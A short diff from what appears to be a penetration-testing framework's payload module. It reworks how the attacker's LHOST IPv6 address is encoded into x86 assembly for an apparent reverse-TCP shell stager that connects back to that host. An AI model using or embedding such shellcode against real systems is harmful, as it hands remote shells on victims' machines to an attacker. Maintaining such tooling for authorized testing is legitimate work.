@@ -38,12 +38,8 @@ def generate_stage
       tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.
 
       # ipv6 address conversion
-      words  = IPAddr.new(datastore['LHOST']).hton.scan(/..../).map {|i| i.unpack('V')} # converts user's input into ipv6 hex representation
-      first  = words[0].join(', ') # removes brackets, otherwise will reference to a pointer
-      second = words[1].join(', ')
-      third  = words[2].join(', ')
-      fourth = words[3].join(', ')
-
+      # converts user's input into ipv6 hex representation
+      words = IPAddr.new(datastore['LHOST']).hton.scan(/..../).map {|i| i.unpack('V').first.to_s(16)}
       payload_data =<<-EOS
         xor  ebx,ebx
         mul  ebx
@@ -61,10 +57,10 @@ def generate_stage
         xor  ebx,ebx
         push ebx
         push ebx
-        push #{fourth}
-        push #{third}
-        push #{second}
-        push #{first}
+        push 0x#{words[3]}
+        push 0x#{words[2]}
+        push 0x#{words[1]}
+        push 0x#{words[0]}
         push ebx
         push.i16 0x#{tcp_port}
         push.i16 0xa
